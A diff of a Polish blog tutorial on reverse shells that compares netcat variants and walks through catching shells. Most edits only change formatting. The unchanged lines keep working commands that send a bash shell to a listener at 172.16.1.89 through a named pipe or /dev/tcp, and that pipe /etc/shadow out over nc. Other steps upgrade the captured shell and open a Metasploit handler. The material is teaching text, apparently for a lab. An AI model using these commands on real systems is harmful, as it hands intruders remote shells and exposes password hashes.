@@ -13,13 +13,13 @@ header:
 ---
 
 # Co to takiego jest i do czego służy Reverse Shell?
-**Reverse shell** (czyli odwrócone połączenie powłoki) to technika często wykorzystywana w dziedzinie cyberbezpieczeństwa. Polega ona na ustanowieniu połączenia zdalnego z systemem komputerowym i zdalnym uruchomieniu powłoki (w wypadku Linuxa Sh/Bash). W tradycyjnym połączeniu zdalnym, atakujący nawiązuje połączenie z ofiarą. Natomiast w przypadku reverse shell, to ofiara nawiązuje połączenie z atakującym. Zajmiemy się głównie **Reverse Shellem**.
+**Reverse shell** (czyli odwrócone połączenie powłoki) to technika często wykorzystywana w dziedzinie cyberbezpieczeństwa. Polega ona na ustanowieniu połączenia zdalnego z systemem komputerowym i zdalnym uruchomieniu powłoki (w wypadku **Linuxa** Sh/Bash). W tradycyjnym połączeniu zdalnym, atakujący nawiązuje połączenie z ofiarą. Natomiast w przypadku reverse shell, to ofiara nawiązuje połączenie z atakującym. Zajmiemy się głównie **Reverse Shellem**.
 {: .text-justify}
 # Jakich programów do tego potrzebuje?
 Zajmiemy się tutaj Linuxem. Opisze programy na ten system, chociaż na **Windowsa** też jest do tego program o nazwie **Nc**. Niestety wersji **Nc** na **Linuxa** jest dosyć dużo i mogą wprowadzić pewne zamieszanie:
 {: .text-justify}
 ## GNU Netcat (netcat-traditional)
-Ta wersja jest najbardziej - jakby to powiedzieć - pierwotna. Program został napisany przez osobę przedstawiającą się jako Hobbit. Ciekawostką jest to, że nie działa wyświetlenie helpa przez wpisanie **nc --help**. Spotykany jest tutaj dosyć niski numer wersji (u mnie na rok 2023 - [v1.10-47]). W odróżnieniu od **OpenBSD Netcat (netcat-openbsd)** ta wersja posiada przełączniki **-c** lub **-e**, pozwalające uruchomić i przekierować **Basha**, **Sh** itd. Pakiet, który jest w **debianie** nazywa się **netcat-traditional**. Po wykonaniu komendy: 
+Ta wersja jest najbardziej - jakby to powiedzieć - pierwotna. Program został napisany przez osobę przedstawiającą się jako Hobbit. Ciekawostką jest to, że nie działa wyświetlenie helpa przez wpisanie _nc --help_. Spotykany jest tutaj dosyć niski numer wersji (u mnie na rok 2023 - [v1.10-47]). W odróżnieniu od **OpenBSD Netcat (netcat-openbsd)** ta wersja posiada przełączniki _-c_ lub _-e_, pozwalające uruchomić i przekierować **Basha**, **Sh** itd. Pakiet, który jest w **Debianie** nazywa się _netcat-traditional_. Po wykonaniu komendy: 
 {: .text-justify}
 ```bash
 nc -help 
@@ -56,10 +56,10 @@ options:
 port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 ```
-Port z pakietu **Nmap** posiada wysoki numer (7.70) i działa wpisanie **nc --help**. Po tym też można poznać, jaka to jest wersja, chociaż nie tylko.
+Port z pakietu **Nmap** posiada wysoki numer (7.70) i działa wpisanie _nc --help_. Po tym też można poznać, jaka to jest wersja, chociaż nie tylko.
 {: .text-justify}
 ## OpenBSD Netcat (netcat-openbsd)
-Ta wersja została przepisana z wersji tradycyjnej, dodano parę funkcji, ale niestety usunięto przełączniki **-c** i **-e**. Ma to związek z tym, że ta implementacja jest jest silnie związana z bezpieczeństwem. Dodano bardzo przydatny przełącznik **-N**, który się przydaje przy przesyłaniu plików. Pakiet pod Debiana nazywa się **netcat-openbsd**. Po wykonaniu komendy (--help do końca nie działa) widzimy: 
+Ta wersja została przepisana z wersji tradycyjnej, dodano parę funkcji, ale niestety usunięto przełączniki _-c_ i _-e_. Ma to związek z tym, że ta implementacja jest jest silnie związana z bezpieczeństwem. Dodano bardzo przydatny przełącznik _-N_, który się przydaje przy przesyłaniu plików. Pakiet pod Debiana nazywa się _netcat-openbsd_. Po wykonaniu komendy (_--help_ do końca nie działa) widzimy: 
 {: .text-justify}
 ```bash
 nc -help
@@ -109,7 +109,7 @@ usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
         Port numbers can be individual or ranges: lo-hi [inclusive]
 ```
 ## Nmap-ncat (od Network Mapper)
-Żeby jeszcze bardziej namieszać, jest jeszcze jest **Ncat** od osoby, która napisała program **Nmap (Network Mapper)**, czyli od Gordona Lyona. Pogram charakteryzuje się dosyć wysoką wersją (w porównaniu do pierwowzoru). Na szczęście (albo i nie) są przełączniki **-c** i **-e** pozwalające uruchomić **Bash** lub inną konsolę. Na **Redhacie** pakiet nazywa się **nmap-ncat**, zaś na **Debianie** po prostu **ncat**. Zauważyłem, że na **Debianie** możemy mieć dwa **Netcaty**. Jeżeli są dwa, to ten pierwotny nazywa **nc.traditional**, drugi zaś normalnie **nc**. Help w **nc** od **Nnapa** wygląda tak:
+Żeby jeszcze bardziej namieszać, jest jeszcze jest **Ncat** od osoby, która napisała program **Nmap (Network Mapper)**, czyli od Gordona Lyona. Pogram charakteryzuje się dosyć wysoką wersją (w porównaniu do pierwowzoru). Na szczęście (albo i nie) są przełączniki _-c_ i _-e_ pozwalające uruchomić **Bash** lub inną konsolę. Na **Redhacie** pakiet nazywa się _nmap-ncat_, zaś na **Debianie** po prostu _ncat_. Zauważyłem, że na **Debianie** możemy mieć dwa **Netcaty**. Jeżeli są dwa, to ten pierwotny nazywa _nc.traditional_, drugi zaś normalnie _nc_. Help naszego programu od **Nmapa** wygląda tak:
 {: .text-justify}
 ```bash
 nc --help
@@ -174,7 +174,7 @@ Uff, wstęp już przeszliśmy, czas przejść do działania.
 {: .text-justify}
 Na szczęście aby nasłuchiwać, nie trzeba się przejmować z jakiej rodziny jest **nc**. Użycie tego programu, mimo że z dwóch rodzin, wygląda to podobnie. Później jeszcze opiszę moduł nasłuchujący z **Metasploita**.
 {: .text-justify}
-### Netcat (netcat-traditional i OpenBSD)
+### Netcat (tradycyjny i OpenBSD)
 {: .text-justify}
 Wpisujemy
 {: .text-justify}
@@ -186,7 +186,7 @@ Pokazuje się komunikat:
 ```bash
 Listening on 0.0.0.0 1337
 ```
-Jeżeli się połączymy to powinniśmy widzieć mniej więcej taką odpowiedź.
+Jeżeli się połączymy to powinniśmy widzieć mniej więcej taką odpowiedź:
 {: .text-justify}
 ```bash
 Connection received on 172.x.x.xx 37052
@@ -224,7 +224,7 @@ Active sessions
   msf6 exploit(multi/handler) > sessions 2
 [*] Starting interaction with 2...
 ```
-Powłoką na **Metasploicie** nie będziemy się zajmować, podałem tylko przykład jako ciekawostkę. Wróćmy jednak do **nc** wysyłającego shell.
+Powłoką na **Metasploicie** nie będziemy się zajmować, podałem tylko przykład jako ciekawostkę. Wróćmy jednak do _nc_ wysyłającego shell.
 {: .text-justify}
 # Wysyłanie
 I tutaj zaczynają się niestety schody. **Nc** **Nc** w tym wypadku nierówny.
@@ -247,13 +247,13 @@ Tu jest już gorzej. **Nc** z **OpenBSD** nie ma przełącznika **-c** ani **-e*
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash 2>&1 | nc 172.16.1.89 1337 > /tmp/f
 ```
 # Mam połączenie, ale i nie mam znaku zachęty
-Nie ma sprawy, można to naprawić na parę sposobów. Na konsoli gdzie odbieramy połączenie wpisujemy.
+Nie ma sprawy, można to naprawić na parę sposobów. Na konsoli gdzie odbieramy połączenie wklepujemy.
 {: .text-justify}
-## python
+## Python
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-## script
+## Script
 ```bash
 script /dev/null -c /bin/bash
 ```
@@ -261,7 +261,7 @@ script /dev/null -c /bin/bash
 Script started, file is /dev/null
 [root@rocky8-test1 ~]# 
 ```
-Polecam ten drugi sposób z uruchomieniem programu **script**
+Polecam ten drugi sposób z uruchomieniem programu **Script**
 {: .text-justify}
 # Ale skąd te krzaki?
 ```bash
@@ -273,23 +273,24 @@ Po wejściu na konsolę, podczas ruszania strzałkami są krzaki. również po n
 [root@rocky8-test1 ~]# ^Z      
 [1]+  Zatrzymano              nc -lvnp 1337
 ```
-Następnie wpisujemy:
+Następnie:
 {: .text-justify}
 ```bash
 stty raw -echo; fg
 reset xterm
 ```
-Teraz można dowolnie sterować strzałkami:
+Teraz można dowolnie sterować strzałkami (_ctrl+c_ nie zamyka konsoli):
 {: .text-justify}
-[root@rocky8-test1 ~]# ^C
-[root@rocky8-test1 ~]# ^C
-# wyszedłem z konsoli, ale nic nie mogę napisać
+```bash
+[root@rocky8-test1 ~]# ^C ^C
+```
+# Wyszedłem z konsoli, ale nic nie mogę napisać
 Spoko, wystarczy że wpiszesz:
 {: .text-justify}
 ```bash
 stty sane
 ```
-# Na przejętej maszynie nie ma nc
+# Na przejętej maszynie nie ma Nc
 Nie przejmuj się, możesz **Basha** użyć do przerzucenia **Basha** :smiley: Jednak ta metoda działa już na przejętej maszynie
 {: .text-justify}
 ```bash
@@ -299,7 +300,7 @@ bash -i &> /dev/tcp/172.16.1.89/1337 0>&1
 ## Wysyłanie plików
 Możesz przerzucić plik i tutaj polecam **Nc** w wersji **OpenBSD** w ten sposób:
 {: .text-justify}
-### przejęta maszyna 
+### Przejęta maszyna 
 Jak już wcześniej wspomniałem przełącznik **-N** działa tylko na **Nc** z **OpenBSD**. Po przesłaniu pliku program sam kończy prace. Niestety w przypadku innego - tradycyjnego, z pakietu **nmap** - trzeba po wysłaniu pliku, wcisnąć **ctrl+c** aby zakończyć.
 {: .text-justify}
 ```bash
@@ -308,11 +309,11 @@ cat /etc/shadow | nc -vN 172.16.1.89 1337
 ```bash
 Connection to 172.16.1.89 1337 port [tcp/menandmice-dns] succeeded!
 ```
-### nasza maszyna
+### Nasza maszyna
 ```bash
 nc -lvnp 1337 > shadow
 ```
-# Przekierowanie portów
+## Przekierowanie portów
 Tak, tutaj też można użyć **Nc**, chociaż najlepiej się do tego nadaje **Socat**. Poniżej przykład użycia.
 {: .text-justify}
 ```bash
